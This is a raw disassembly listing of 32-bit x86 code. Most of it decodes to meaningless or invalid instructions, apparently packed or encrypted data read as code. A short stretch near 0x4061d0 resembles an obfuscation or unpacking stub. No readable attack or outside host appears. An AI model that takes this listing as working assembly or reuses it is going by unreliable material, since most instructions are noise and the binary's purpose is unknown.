  4060eb:	mov    ebx,0xa5cdb803
  4060f0:	push   0xaf02b08d
  4060f5:	sbb    al,0xb2
  4060f7:	adc    ebp,DWORD PTR [edx+0x4b]
  4060fa:	xchg   BYTE PTR [ecx],ah
  4060fc:	mov    ebx,0xeb9cdb8f
  406101:	sub    eax,0x7655d5d7
  406106:	icebp  
  406107:	fstp   QWORD PTR [ecx+0x6e]
  40610a:	ror    DWORD PTR [eax-0x32bcbdb2],cl
  406110:	cli    
  406111:	(bad)  
  406112:	pop    ecx
  406113:	or     BYTE PTR [ebp+0x322436c8],dl
  406119:	cld    
  40611a:	add    al,0x49
  40611c:	lea    esi,[ebx]
  40611e:	pop    esp
  40611f:	pop    eax
  406120:	or     al,0x6d
  406122:	sbb    dh,ah
  406124:	pop    edx
  406125:	fdivr  DWORD PTR ds:0x8d8b7f7b
  40612b:	xlat   BYTE PTR ds:[ebx]
  40612c:	adc    bh,BYTE PTR [ecx-0x4e]
  40612f:	sti    
  406130:	xchg   esi,eax
  406131:	mov    bl,0xe0
  406133:	(bad)  
  406134:	pop    eax
  406135:	imul   ebx,DWORD PTR [ebx+0x2f],0x23
  406139:	call   0x7d83e092
  40613e:	cs mov dh,0x17
  406141:	imul   ebp,DWORD PTR [ebx],0x4edb0812
  406147:	imul   ebx,DWORD PTR [eax],0x8518488
  40614d:	mul    DWORD PTR [eax+0x4dcd300a]
  406153:	outs   dx,DWORD PTR ds:[esi]
  406154:	in     eax,dx
  406155:	inc    ecx
  406156:	jne    0x406147
  406158:	lods   al,BYTE PTR ds:[esi]
  406159:	fxch   st(7)
  40615b:	mov    dl,0x23
  40615d:	add    al,0xd8
  40615f:	jmp    0x406187
  406161:	xor    al,0xbd
  406163:	sub    BYTE PTR ds:0x29d6ada6,ch
  406169:	mov    edx,0x769284d4
  40616e:	pop    ebx
  40616f:	xchg   esp,eax
  406170:	xchg   ebx,eax
  406171:	jmp    0x4061cc
  406173:	push   esp
  406174:	jmp    0xeef1:0xae6f7cf1
  40617b:	xor    al,0x39
  40617d:	shl    DWORD PTR [ebp+0x15],0xcf
  406181:	scas   al,BYTE PTR es:[edi]
  406182:	lock mov cs,WORD PTR [edx+ecx*8-0x46b626a0]
  40618a:	jnp    0x406144
  40618c:	mov    ebp,ecx
  40618e:	aas    
  40618f:	lods   al,BYTE PTR ds:[esi]
  406190:	sbb    eax,0xa3b33ee6
  406195:	dec    edx
  406196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406197:	jno    0x4061d2
  406199:	(bad)  
  40619a:	mov    ds:0xedf3cc4c,eax
  40619f:	out    0x35,al
  4061a1:	pop    edx
  4061a2:	loope  0x40621d
  4061a4:	stc    
  4061a5:	pop    esp
  4061a6:	mov    ebx,0xfb034a58
  4061ab:	mov    edi,edi
  4061ad:	test   al,0x3f
  4061af:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b1:	dec    ebp
  4061b2:	cs lahf 
  4061b4:	fsubr  st(4),st
  4061b6:	hlt    
  4061b7:	ja     0x406141
  4061b9:	test   BYTE PTR [ecx],bl
  4061bb:	div    BYTE PTR [edx+0x32]
  4061be:	add    BYTE PTR [ebx-0x39ccf3bb],cl
  4061c4:	add    eax,edi
  4061c6:	pop    edi
  4061c7:	pop    esi
  4061c8:	pop    ebx
  4061c9:	leave  
  4061ca:	ret    0x8
  4061cd:	xor    eax,eax
  4061cf:	ret    
  4061d0:	push   ebp
  4061d1:	mov    ebp,esp
  4061d3:	sub    esp,0x38
  4061d6:	and    DWORD PTR ds:0x428ec7,0x0
  4061e0:	xor    eax,eax
  4061e2:	xor    eax,DWORD PTR ds:0x428ec7
  4061e8:	inc    eax
  4061e9:	mov    ds:0x428ec7,eax
  4061ee:	cmp    DWORD PTR ds:0x428ec7,0x24
  4061f5:	jg     0x406216
  4061fb:	jmp    0x406209
  406200:	push   DWORD PTR [ebp-0x18]
  406203:	call   DWORD PTR ds:0x42aa2b
  406209:	cmp    DWORD PTR ds:0x428ec7,0x19
  406210:	jb     0x4061e0
  406216:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40621d:	push   ebx
  40621e:	mov    eax,ds:0x428e23
  406223:	adc    DWORD PTR ds:0x428e9f,eax
  406229:	jmp    0x4085d8
  40622e:	xchg   ebp,eax
  40622f:	(bad)
  406232:	xchg   edx,eax
  406233:	add    al,0x95
  406235:	(bad)
  406239:	stos   DWORD PTR es:[edi],eax
  40623a:	push   0xb85a8f0
  40623f:	cmp    eax,0x60f18383
  406244:	add    DWORD PTR [ebx-0x3aa24879],0xffffff8c
  40624b:	out    0x4c,al
  40624d:	mov    fs,WORD PTR [eax+0x7]
  406250:	out    dx,al
  406251:	stos   DWORD PTR es:[edi],eax
  406252:	mov    bh,0xfa
  406254:	cmp    edi,DWORD PTR [ebx+ebx*8+0x6d]
  406258:	into   
  406259:	jmp    0xee13d3bd
  40625e:	cmp    DWORD PTR [esi-0x6b],esi
  406261:	adc    BYTE PTR [ecx-0x46],dh
  406264:	popf   
  406265:	pop    edx
  406266:	pop    eax
  406267:	pop    si
  406269:	test   al,0xa6
  40626b:	or     esp,esp
  40626d:	pop    eax
  40626e:	out    0xa5,eax
  406270:	mov    al,0xb0
  406272:	les    edx,FWORD PTR [edi]
  406274:	repnz mul BYTE PTR [ebx-0x73]
  406278:	not    BYTE PTR [ecx-0xeb8e308]
  40627e:	shl    DWORD PTR cs:[edx],1
  406281:	push   esp
  406282:	cmp    DWORD PTR [ecx],ebp
  406284:	test   BYTE PTR [edi],dl
  406286:	(bad)  
  406287:	fdivr  DWORD PTR [edx+0x14562049]
  40628d:	xor    eax,0xaf67d3ad
  406292:	inc    ebp
  406293:	and    edi,ebx
  406295:	fwait
  406296:	ds jg  0x406247
  406299:	cs nop
  40629b:	cdq    
  40629c:	mov    dl,0xe5
  40629e:	jle    0x406251
  4062a0:	mov    ebp,0x7814c4a3
  4062a5:	les    edx,FWORD PTR [eax+0x4a869632]
  4062ab:	jno    0x40626d
  4062ad:	aaa    
  4062ae:	jbe    0x4062a1
  4062b0:	popf   
  4062b1:	add    bh,BYTE PTR [edx]
  4062b3:	mov    WORD PTR [esp+eiz*4+0x57],fs
  4062b7:	jbe    0x40626e
  4062b9:	div    BYTE PTR [edx-0x65]
  4062bc:	jmp    0x406288
  4062be:	mov    ebx,DWORD PTR [eax]
  4062c0:	or     edi,DWORD PTR [edx*4+0x6b7487ae]
  4062c7:	jmp    0xe8e872e5
  4062cc:	test   eax,0x90d7c5b3
  4062d1:	push   esp
  4062d2:	lods   eax,DWORD PTR cs:[esi]
  4062d4:	cli    
  4062d5:	inc    ebx
  4062d6:	dec    esp
  4062d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062d8:	cld    
  4062d9:	shr    BYTE PTR [esi+0x5724fe69],1
  4062df:	fiadd  WORD PTR [ebp-0x6a8f7414]
  4062e5:	mov    dl,BYTE PTR [edx-0x2]
  4062e8:	cmp    ch,al
  4062ea:	shl    DWORD PTR [edx-0x33],1
  4062ed:	dec    edi
  4062ee:	aad    0x18
  4062f0:	sub    eax,0xb5b113c9
  4062f5:	das    
  4062f6:	or     al,0x13
  4062f8:	and    dh,BYTE PTR [ecx+0x1c073230]
  4062fe:	add    al,0x26
  406300:	enter  0x1be0,0x19
  406304:	inc    ebp
  406305:	stc    
  406306:	inc    esp
  406307:	fcomi  st,st(4)
  406309:	je     0x406293
  40630b:	inc    esi
  40630c:	ja     0x406357
  40630e:	push   cs
  40630f:	or     ah,BYTE PTR [edx]
  406311:	sahf   
  406312:	add    al,0xa4
  406314:	rcl    BYTE PTR ss:[ecx+0x2],cl
  406318:	(bad)
  40631b:	rol    edi,1
  40631d:	and    ah,bh
  40631f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406320:	int3   
  406321:	shr    DWORD PTR [edx-0x160c8e0],cl
  406327:	push   0x58
  406329:	mov    al,0xcf
  40632b:	or     eax,0xfb5b1a4d
  406330:	repz adc al,0x2f
  406333:	push   0x24426a88
  406338:	das    
  406339:	scas   eax,DWORD PTR es:[edi]
  40633a:	sub    esi,DWORD PTR [edx-0x4a]
  40633d:	mov    dh,0xde
  40633f:	and    eax,0x626c35d9
  406344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406345:	pop    edi
  406346:	inc    eax
  406347:	sub    al,0x3e
  406349:	and    eax,DWORD PTR gs:[edi-0x234a4e87]
  406350:	out    dx,eax
  406351:	sti    
  406352:	out    dx,al
  406353:	imul   DWORD PTR [edi]
  406355:	jg     0x406391
  406357:	outs   dx,DWORD PTR ds:[esi]
  406358:	cmp    cl,ch
  40635a:	pop    ebp
  40635b:	cld    
  40635c:	fist   DWORD PTR [esi]
  40635e:	repnz out 0x38,al
  406361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406362:	push   ds
  406363:	pop    ecx
  406364:	inc    edi
  406365:	es mov ch,0x4f
  406368:	and    bl,0x9e
  40636b:	pop    eax
  40636c:	cld    
  40636d:	retf   0x47cb
  406370:	pop    ss
  406371:	push   ecx
  406372:	fs and ebx,ecx
  406375:	xchg   DWORD PTR [esi],edi
  406377:	or     eax,0x63eee639
  40637c:	(bad)  
  40637d:	imul   ebx,DWORD PTR [ebx+0x6c74567d],0x57
  406384:	cmp    BYTE PTR [ebx+0x4b],0xde
  406388:	popa   
  406389:	mov    al,BYTE PTR [ecx+0x35]
  40638c:	data16 loopne 0x406386
  40638f:	sub    DWORD PTR [ebp-0x2bce8ab2],0xc7116c2b
  406399:	push   ebp
  40639a:	push   0xffffff81
  40639c:	jle    0x40634b
  40639e:	shl    DWORD PTR [esi],cl
  4063a0:	sbb    ebx,DWORD PTR ds:[edi+0x59]
  4063a4:	test   al,0x93
  4063a6:	cmp    BYTE PTR [edx+0x6c50815d],bl
  4063ac:	add    cl,BYTE PTR [ebx+ecx*8+0x7ae05805]
  4063b3:	out    0x52,eax
  4063b5:	int3   
  4063b6:	test   BYTE PTR [esi-0x1c],0x56
  4063ba:	in     eax,0x33
  4063bc:	pop    eax
  4063bd:	pop    ecx
  4063be:	icebp  
  4063bf:	adc    BYTE PTR [ecx-0x57127179],bl
  4063c5:	xchg   esi,eax
  4063c6:	loope  0x4063d9
  4063c8:	cmp    eax,0x9053c1a1
  4063cd:	or     dl,BYTE PTR [eax-0x6b9f09ce]
  4063d3:	bound  edx,QWORD PTR [edi-0xc3e33cc]
  4063d9:	(bad)  [esi+0x18e9733a]
  4063df:	ins    BYTE PTR es:[edi],dx
  4063e0:	or     al,0xf9
  4063e2:	mov    ebx,0xb5814511
  4063e7:	pop    ebp
  4063e8:	push   ebp
  4063e9:	cwde   
  4063ea:	xor    eax,0x6df5cf01
  4063ef:	ins    DWORD PTR es:[edi],dx
  4063f0:	aaa    
  4063f1:	clc    
  4063f2:	or     BYTE PTR [edi+esi*4-0x53602533],0xc3
  4063fa:	dec    esi
  4063fb:	mov    dh,0xf3
  4063fd:	adc    ebp,DWORD PTR ds:0xe69f4805
  406403:	inc    ecx
  406404:	cli    
  406405:	jp     0x4063e3
  406407:	mov    ds:0x48f20e46,eax
  40640c:	pop    ds
  40640d:	(bad)  
  40640e:	adc    al,0xee
  406410:	mov    WORD PTR [ecx],cs
  406412:	adc    al,0xb1
  406414:	or     edi,DWORD PTR [ebp-0x5f]
  406417:	sbb    bh,bh
  406419:	test   eax,0x815e17e2
  40641e:	mov    ch,0xf5
  406420:	sub    eax,0x8bfe4496
  406425:	dec    edx
  406426:	mov    dh,0x3f
  406428:	or     al,0xff
  40642a:	outs   dx,DWORD PTR ds:[esi]
  40642b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40642c:	lahf   
  40642d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40642e:	mov    BYTE PTR [edx],dl
  406430:	and    edi,DWORD PTR [edi+0x6]
  406433:	lds    ecx,FWORD PTR [ecx+eiz*4-0x52]
  406437:	clc    
  406438:	xchg   ebp,eax
  406439:	mov    fs,WORD PTR [edi+0x2a]
  40643c:	mov    WORD PTR [esi],?
  40643e:	shl    BYTE PTR [eax-0x65e96e04],1
  406444:	pop    ebx
  406445:	jp     0x40642c
  406447:	enter  0xea10,0xe3
  40644b:	adc    al,0x53
  40644d:	mov    DWORD PTR [di+0x2e],ecx
  406451:	(bad)  
  406452:	hlt    
  406453:	ret    0x523d
  406456:	fs add eax,0x1c146d0c
  40645c:	mov    ebp,0x254e2bb6
  406461:	jge    0x4064ad
  406463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406464:	shl    BYTE PTR cs:[eax+0x22b1b76a],0x56
  40646c:	push   esi
  40646d:	xor    eax,0xdb107601
  406472:	jo     0x406431
  406474:	or     esp,ecx
  406476:	pop    ebx
  406477:	mov    esp,0x54f601fe
  40647c:	ret    0x4470
  40647f:	xchg   DWORD PTR [edi+0x49],esp
  406482:	rol    BYTE PTR [ecx+0x4d],cl
  406485:	xchg   edx,eax
  406486:	ja     0x4064ed
  406488:	int    0x45
  40648a:	in     al,0x2e
  40648c:	lahf   
  40648d:	and    eax,0xf60faa42
  406492:	adc    ebx,eax
  406494:	sahf   
  406495:	fadd   QWORD PTR [eax+0x6615ebcb]
  40649b:	xchg   edx,eax
  40649c:	add    edi,edx
  40649e:	out    0x2e,eax
  4064a0:	or     BYTE PTR [ebx+0x1cc910e7],ch
  4064a6:	mov    esi,0xb67a7180
  4064ab:	cmp    DWORD PTR [eax],esp
  4064ad:	push   ecx
  4064ae:	shl    esi,0x93
  4064b1:	pop    ecx
  4064b2:	popf   
  4064b3:	aad    0x87
  4064b5:	xor    al,0x14
  4064b7:	dec    esp
  4064b8:	sbb    dl,bh
  4064ba:	pop    ecx
  4064bb:	cmp    bh,bl
  4064bd:	(bad)  
  4064bf:	in     al,dx
  4064c0:	enter  0x65e0,0xbf
  4064c4:	xchg   edx,eax
  4064c5:	loop   0x40652a
  4064c7:	lahf   
  4064c8:	repz cmp BYTE PTR [esi+0x51c01af8],bh
  4064cf:	or     al,0x6a
  4064d1:	cld    
  4064d2:	jge    0x4064f2
  4064d4:	and    bl,ch
  4064d6:	cmp    al,0xef
  4064d8:	push   ss
  4064d9:	dec    ebx
  4064da:	in     eax,dx
  4064db:	pushf  
  4064dc:	adc    bh,bh
  4064de:	xchg   edi,eax
  4064df:	pushf  
  4064e0:	fwait
  4064e1:	les    ebp,FWORD PTR [ebx-0x5]
  4064e4:	cmp    ebp,esi
  4064e6:	xchg   ebx,eax
  4064e7:	xchg   esi,eax
  4064e8:	pop    es
  4064e9:	mov    bh,0xf7
  4064eb:	cmp    esp,ecx
  4064ed:	scas   al,BYTE PTR es:[edi]
  4064ee:	or     ebp,DWORD PTR [eax-0x65f0932]
  4064f4:	(bad)  
  4064f5:	shl    ah,cl
  4064f7:	dec    ebp
  4064f8:	push   es
  4064f9:	jb     0x406536
  4064fb:	inc    edx
  4064fc:	pop    ebx
  4064fd:	pusha  
  4064fe:	in     eax,dx
  4064ff:	lds    ebp,FWORD PTR [eax]
  406501:	pop    esi
  406502:	int3   
  406503:	or     eax,0x6e216139
  406508:	call   0xa8ff:0xf6545cf1
  40650f:	outs   dx,DWORD PTR ds:[esi]
  406510:	daa    
  406511:	or     al,0xe8
  406513:	clc    
  406514:	aad    0xbf
  406516:	push   ebp
  406517:	scas   al,BYTE PTR es:[edi]
  406518:	push   esi
  406519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40651a:	repz sar BYTE PTR [eax+0x7562a46e],0xf3
  406522:	cwde   
  406523:	test   bl,cl
  406525:	lods   eax,DWORD PTR ds:[esi]
  406526:	sti    
  406527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406528:	push   ds
  406529:	mov    cl,0xb
  40652b:	fimul  WORD PTR [edi]
  40652d:	fdiv   DWORD PTR [esi-0x2d2a96e9]
  406533:	ins    BYTE PTR es:[edi],dx
  406534:	dec    ecx
  406535:	mov    dl,0xc0
  406537:	adc    bl,bl
  406539:	hlt    
  40653a:	cmp    eax,0xa16f7061
  40653f:	adc    ebp,DWORD PTR [edi-0x35]
  406542:	aas    
  406543:	mov    ds:0x2ec9936d,eax
  406548:	inc    edx
  406549:	scas   al,BYTE PTR es:[edi]
  40654a:	ret    
  40654b:	aam    0xdd
  40654d:	and    eax,0x8ada7ab
  406552:	cmp    DWORD PTR [ebx+0x21],esi
  406555:	or     DWORD PTR [ebp+0x4],ebx
  406558:	mov    ecx,0x9a6b4ece
  40655d:	fcom   QWORD PTR ds:0x23fce5ae
  406563:	and    ecx,ebp
  406565:	les    esp,FWORD PTR [esi+esi*2+0x5e]
  406569:	jmp    0x858b:0x2dd985eb
  406570:	fisttp DWORD PTR [esi]
  406572:	cli    
  406573:	aas    
  406574:	dec    ebx
  406575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406576:	fsub   st,st(6)
  406578:	aaa    
  406579:	icebp  
  40657a:	mov    ebp,eax
  40657c:	inc    esi
  40657d:	imul   edi,DWORD PTR [edx],0xc5f033d8
  406583:	sub    edi,DWORD PTR [ecx]
  406585:	stos   DWORD PTR es:[edi],eax
  406586:	test   al,0x4f
  406588:	int3   
  406589:	inc    esp
  40658a:	icebp  
  40658b:	jne    0x4065e5
  40658d:	adc    eax,0x7192d6f7
  406592:	ror    DWORD PTR [edi+ebp*8+0x1c7dc25f],0x65
  40659a:	jno    0x4065c9
  40659c:	lahf   
  40659d:	cmp    BYTE PTR es:[edi+0x38c95848],0xdb
  4065a5:	inc    BYTE PTR ds:0x1fbf3526
  4065ab:	xchg   DWORD PTR [ebx+ecx*8+0x4e],ecx
  4065af:	add    eax,0x366e8e4f
  4065b4:	out    dx,al
  4065b5:	imul   edx,DWORD PTR [eax-0x31],0x407a568a
  4065bc:	sbb    eax,0xd5868cdd
  4065c1:	(bad)  
  4065c2:	leave  
  4065c3:	add    eax,0x13b61778
  4065c8:	mov    dh,0x7e
  4065ca:	pop    eax
  4065cb:	aaa    
  4065cc:	mov    esi,DWORD PTR [edx]
  4065ce:	dec    DWORD PTR [ebx-0x39]
  4065d1:	shr    ebp,0xcd
  4065d4:	dec    edx
  4065d5:	or     eax,0xa2ac554d
  4065da:	rcl    BYTE PTR [ebp-0xa650470],cl
  4065e0:	xchg   edi,eax
  4065e1:	inc    esp
  4065e2:	xchg   ebx,eax
  4065e3:	mov    edx,0x9356eb89
  4065e8:	push   ebp
  4065e9:	dec    esp
  4065ea:	dec    ebx
  4065eb:	cmc    
  4065ec:	xor    al,0x61
  4065ee:	out    0x7f,al
  4065f0:	outs   dx,BYTE PTR ds:[esi]
  4065f1:	pop    es
  4065f2:	xor    al,0xec
  4065f4:	leave  
  4065f5:	mov    dl,0x4b
  4065f7:	and    al,0x7b
  4065f9:	call   0x13b0:0x9af5104b
  406600:	xor    al,0xf0
  406603:	rcr    edx,1
  406605:	xchg   edx,eax
  406606:	daa    
  406607:	stos   DWORD PTR es:[edi],eax
  406608:	xlat   BYTE PTR ds:[ebx]
  406609:	pop    ebx
  40660a:	jnp    0x40663b
  40660c:	or     BYTE PTR [eax+0x61],ch
  40660f:	retf   0xa08d
  406612:	and    cl,BYTE PTR [eax-0x5]
  406615:	das    
  406616:	cmp    bl,BYTE PTR [edi-0x621cd8c0]
  40661c:	(bad)  [edx+eiz*8-0x4949e346]
  406623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406624:	pushf  
  406625:	dec    esi
  406626:	fldcw  WORD PTR [esi-0xd]
  406629:	cwde   
  40662a:	clc    
  40662b:	or     BYTE PTR [edx],dh
  40662d:	cmp    eax,eax
  40662f:	fwait
  406630:	in     al,dx
  406631:	ds adc eax,0x13cbdab0
  406637:	iret   
  406638:	dec    esp
  406639:	cmp    dh,al
  40663b:	mov    BYTE PTR [ebx+eiz*4+0x6e7b720b],bl
  406642:	lahf   
  406643:	retf   
  406644:	sub    BYTE PTR [edx-0x67dbc655],0xbc
  40664b:	dec    ebp
  40664c:	stc    
  40664d:	ror    DWORD PTR [esi],0x1b
  406650:	cli    
  406651:	lea    ecx,[edx]
  406653:	shr    BYTE PTR ss:[esi],0xd6
  406657:	jo     0x4065ef
  406659:	inc    edx
  40665a:	add    esp,DWORD PTR [ecx+eax*1-0x43]
  40665e:	in     al,0x15
  406660:	inc    edi
  406661:	arpl   sp,bx
  406663:	push   edi
  406664:	ret    0x1b7d
  406667:	ds ss loopne 0x406622
  40666b:	pop    ebp
  40666c:	(bad)  
  40666d:	adc    eax,ecx
  40666f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406670:	test   eax,0x862daf15
  406675:	addr16 ja 0x4066c3
  406678:	push   ebx
  406679:	pop    ds
  40667a:	loopne 0x4066af
  40667c:	fidiv  WORD PTR [ecx-0x54]
  40667f:	stos   DWORD PTR es:[edi],eax
  406680:	or     eax,0xa76d0322
  406685:	mov    ebp,0x5c485a67
  40668a:	test   BYTE PTR [ebx+0x44],0xcb
  40668e:	arpl   WORD PTR [eax+0x207f7083],dx
  406694:	ja     0x40667f
  406696:	jae    0x406707
  406698:	hlt    
  406699:	pop    es
  40669a:	lock dec ecx
  40669c:	xchg   edi,eax
  40669d:	sbb    dl,BYTE PTR [ebp+0x438432e2]
  4066a3:	inc    edi
  4066a4:	in     eax,0x38
  4066a6:	popa   
  4066a7:	call   0xd0deb7d9
  4066ac:	aam    0xe1
  4066ae:	retf   
  4066af:	loope  0x406635
  4066b1:	das    
  4066b2:	pop    edx
  4066b3:	xchg   DWORD PTR [ebp+0x27b1ae35],ecx
  4066b9:	or     ebp,DWORD PTR [edi-0x49]
  4066bc:	adc    bh,BYTE PTR [eax-0x72d81e0a]
  4066c2:	and    al,cl
  4066c4:	mov    WORD PTR ds:0x50d09096,ds
  4066ca:	popa   
  4066cb:	inc    esi
  4066cc:	addr16 (bad) 
  4066ce:	push   eax
  4066cf:	pop    ebx
  4066d0:	pop    esp
  4066d1:	aas    
  4066d2:	out    dx,eax
  4066d3:	and    al,0xd5
  4066d5:	nop
  4066d6:	lsl    ecx,WORD PTR [esi+0x28f921b1]
  4066dd:	pop    es
  4066de:	or     al,0xee
  4066e0:	dec    eax
  4066e1:	imul   ebx,DWORD PTR ds:0xc3562812,0x5183977b
  4066eb:	lahf   
  4066ec:	imul   eax
  4066ee:	adc    cl,bl
  4066f0:	jmp    0xee68:0xefdde912
  4066f7:	push   es
  4066f8:	into   
  4066f9:	jnp    0x406760
  4066fb:	xor    DWORD PTR [eax],0xc8e1a7e
  406701:	rol    BYTE PTR [eax],1
  406703:	push   es
  406704:	sahf   
  406705:	mov    ah,0xdd
  406707:	and    eax,0x5c84a498
  40670c:	mov    bh,0xbc
  40670e:	inc    esi
  40670f:	aas    
  406710:	pop    eax
  406711:	pop    edi
  406712:	dec    ebx
  406713:	test   DWORD PTR [eax-0x56],esp
  406716:	inc    eax
  406717:	pop    ecx
  406718:	sub    BYTE PTR [ebx+0x2e],ah
  40671b:	icebp  
  40671c:	dec    ecx
  40671d:	jle    0x406763
  40671f:	adc    al,0x52
  406721:	pushf  
  406722:	adc    eax,0x12c4297a
  406727:	in     eax,0xb
  406729:	jle    0x406787
  40672b:	lds    eax,FWORD PTR [edi-0x4a]
  40672e:	mov    eax,0xba8ab84a
  406733:	outs   dx,DWORD PTR ds:[esi]
  406734:	pop    ss
  406735:	xlat   BYTE PTR ds:[ebx]
  406736:	adc    bl,BYTE PTR [edx-0x67]
  406739:	stos   BYTE PTR es:[edi],al
  40673a:	jae    0x4066d3
  40673c:	xchg   edi,eax
  40673d:	shr    DWORD PTR [edx+0x43d9b216],cl
  406743:	inc    edx
  406744:	xor    al,0xd5
  406746:	xchg   edi,eax
  406747:	push   edi
  406748:	lock adc al,0x31
  40674b:	mov    dl,0xf7
  40674d:	jmp    0x685b:0xfb8bbe1f
  406754:	and    bl,BYTE PTR [edx+0x3e]
  406757:	mov    bh,0x49
  406759:	dec    ebx
  40675a:	jno    0x4067bd
  40675c:	lea    ebp,gs:[ebx+0x3efe0ddc]
  406763:	mov    es,WORD PTR [eax+0x47]
  406766:	dec    eax
  406767:	inc    esp
  406768:	pop    ebx
  406769:	or     edx,esi
  40676b:	(bad)  
  40676c:	aam    0xf7
  40676e:	repnz fsub DWORD PTR [esi]
  406771:	outs   dx,BYTE PTR ds:[esi]
  406772:	imul   edx,DWORD PTR [eax-0x22],0x47
  406776:	data16 sbb BYTE PTR [edx+eiz*8],al
  40677a:	xchg   esp,eax
  40677b:	(bad)  
  40677c:	fwait
  40677d:	pop    ss
  40677e:	mov    ecx,0x89d9ecf1
  406783:	fnstcw WORD PTR [edx-0x16bce3bb]
  406789:	adc    eax,0x17986ab6
  40678e:	or     eax,0x40cbad91
  406793:	sbb    DWORD PTR [edx+0x3c],edx
  406796:	dec    ecx
  406797:	jb     0x406801
  406799:	cmp    DWORD PTR [eax],edi
  40679b:	jbe    0x406751
  40679d:	inc    ebx
  40679e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40679f:	sub    BYTE PTR [esi],ah
  4067a1:	inc    ebx
  4067a2:	and    eax,esp
  4067a4:	push   edi
  4067a5:	lea    esp,[ebx]
  4067a7:	xchg   DWORD PTR [esi],edx
  4067a9:	sbb    DWORD PTR ds:0x3d04571d,esp
  4067af:	sub    ecx,ecx
  4067b1:	pop    ecx
  4067b2:	xchg   esp,eax
  4067b3:	arpl   WORD PTR [edx+edi*4+0x2],si
  4067b7:	inc    esi
  4067b8:	push   eax
  4067b9:	mov    edi,fs
  4067bb:	sar    BYTE PTR [ebp+0x72],1
  4067be:	lea    edi,[ebp+0x7e5a885e]
  4067c4:	add    bh,0xf9
  4067c7:	mov    ds:0x60ea8b77,eax
  4067cc:	and    eax,0x1da6999f
  4067d1:	(bad)  
  4067d2:	lahf   
  4067d3:	in     al,0xc4
  4067d5:	mov    ah,0x62
  4067d7:	fiadd  WORD PTR [ebx-0x2b]
  4067da:	out    dx,eax
  4067db:	inc    esi
  4067dc:	cmp    dl,ch
  4067de:	popa   
  4067df:	or     DWORD PTR fs:[eax-0x2b97837b],ebx
  4067e6:	sub    DWORD PTR [ebx+0x1a],ebp
  4067e9:	ret    
  4067ea:	mov    edx,0x2c0ecc32
  4067ef:	loop   0x4067c9
  4067f1:	jae    0x4067dc
  4067f3:	add    DWORD PTR [ecx+0xcd432e7],ebp
  4067f9:	repz std 
  4067fb:	jecxz  0x406825
  4067fd:	fistp  DWORD PTR [edi+0xae9d071]
  406803:	mov    esi,0x6b0df5a4
  406808:	and    eax,0x388b3975
  40680d:	or     ah,BYTE PTR [ecx-0x189e5dd6]
  406813:	popf   
  406814:	les    eax,FWORD PTR [edx+0x2f]
  406817:	push   ebx
  406818:	loopne 0x4067cd
  40681a:	data16 ficomp WORD PTR [ebx]
  40681d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40681e:	jl     0x4067d0
  406820:	stc    
  406821:	popa   
  406822:	dec    esp
  406823:	mov    eax,ds:0x42cb70de
  406828:	inc    ebx
  406829:	push   0x7
  40682b:	pop    esp
  40682c:	pop    ecx
  40682d:	loope  0x4067f1
  40682f:	mov    dl,0x24
  406831:	(bad)  
  406832:	pop    esi
  406833:	fbld   TBYTE PTR [edi]
  406835:	mov    ebp,0x6eee2f17
  40683a:	mov    edx,0x53866e7
  40683f:	pop    es
  406840:	jle    0x406838
  406842:	jo     0x40684f
  406844:	mov    ecx,0x621ad800
  406849:	(bad)  
  40684a:	out    0x58,al
  40684c:	sti    
  40684d:	cmp    dl,dl
  40684f:	ss aaa 
  406851:	mov    esp,esi
  406853:	call   0xc1cff746
  406858:	test   BYTE PTR [ebx+ebx*8-0x9],bl
  40685c:	jns    0x40681e
  40685e:	das    
  40685f:	adc    eax,0x6b85f15e
  406864:	or     ah,BYTE PTR [edx+0x5c]
  406867:	outs   dx,DWORD PTR ds:[esi]
  406868:	stos   DWORD PTR es:[edi],eax
  406869:	aas    
  40686a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40686b:	call   DWORD PTR [edi-0x5aa6a099]
  406871:	or     BYTE PTR [edi],bl
  406873:	not    DWORD PTR [ebx-0x23]
  406876:	mov    dh,0xe0
  406878:	es inc esp
  40687a:	loop   0x4068f4
  40687c:	dec    esi
  40687d:	aaa    
  40687e:	aad    0x5e
  406880:	add    esi,esi
  406882:	sub    al,0xa9
  406884:	lahf   
  406885:	inc    edx
  406886:	mov    bh,0x6b
  406888:	inc    edx
  406889:	inc    ebx
  40688a:	mov    esp,0xb25fcb5c
  40688f:	pop    edi
  406890:	push   edx
  406891:	inc    eax
  406892:	pop    esi
  406893:	lea    ecx,[eax]
  406895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406896:	loopne 0x4068c0
  406898:	scas   al,BYTE PTR es:[edi]
  406899:	add    eax,0x4ae53467
  40689e:	cmp    esp,DWORD PTR [eax-0x36f4e280]
  4068a4:	inc    ecx
  4068a5:	mov    eax,ds:0xbb23655f
  4068aa:	nop
  4068ab:	iret   
  4068ac:	into   
  4068ad:	sub    esp,DWORD PTR [edx]
  4068af:	je     0x406870
  4068b1:	fiadd  DWORD PTR [ebx+0x53238062]
  4068b7:	in     eax,dx
  4068b8:	sub    dl,BYTE PTR [edi-0x6e]
  4068bb:	or     eax,0x5aefa846
  4068c0:	cmp    BYTE PTR [esi-0x4c5f6aed],bl
  4068c6:	std    
  4068c7:	les    edx,FWORD PTR [ecx-0x2da81425]
  4068cd:	jmp    0x47b53bf9
  4068d2:	adc    ebp,edi
  4068d4:	sar    BYTE PTR [eax],0xf0
  4068d7:	popf   
  4068d8:	xchg   edi,eax
